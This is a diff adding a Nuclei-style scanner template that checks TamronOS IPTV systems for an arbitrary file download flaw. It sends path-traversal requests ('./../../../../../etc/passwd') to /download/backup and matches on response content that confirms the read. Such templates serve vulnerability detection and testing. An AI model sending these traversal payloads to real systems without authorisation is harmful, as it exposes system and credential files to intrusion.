@@ -1,0 +1,46 @@
+id: tamronos-iptv-backup-file-download
+info:
+  name: TamronOS IPTV Backup File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TamronOS IPTV system is an intelligent TV management system. The system has an arbitrary file download vulnerability, through which an attacker can read system files and obtain sensitive information.
+  tags: file-read
+  reference:
+    - https://fofa.info/
+
+variables:
+  filePath: "./../../../../../etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET /download/backup?name=./../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "bin/sh"
+
+  - raw:
+      - |
+        POST /download/backup?name={{filePath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "filename="
